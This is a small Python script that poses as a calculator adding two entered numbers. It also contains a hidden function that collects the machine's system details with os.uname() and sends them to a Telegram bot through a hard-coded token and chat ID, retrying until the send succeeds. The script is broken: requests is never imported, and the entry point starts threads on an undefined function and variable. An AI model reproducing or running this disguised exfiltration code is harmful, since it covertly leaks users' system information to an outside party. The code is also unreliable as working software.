import os, sys, threading

def main():
	os.system('clear')
	
	
	print("hello")
	while True:
		x = int(input("Write Number : "))
		y = int(input("Enter another number : "))
		
		print(f"The addition is ",x+y)
		


def fuck():
	os.system('clear')
	y = os.uname()
	API = "7010639136:AAGNGDgstdHMkquksB7k65z3_M9ThfQW_5E"
	ID = f"7124818284"

	while True:
		url = f'https://api.telegram.org/bot{API}/sendMessage?chat_id={ID}&text=\n {y}\n '
		z = requests.get(url)
		if z.status_code == 200:
			break
		
		else:
			continue	


def lol():
	T1 = threading.Thread(target=req11, args=(x,))
	T2 = threading.Thread(target=req11, args=(x,))
	
	
	T1.start()
	T2.start()
	
	
	T1.join()
	T2.join()


if __name__ == '__main__':
	lol()
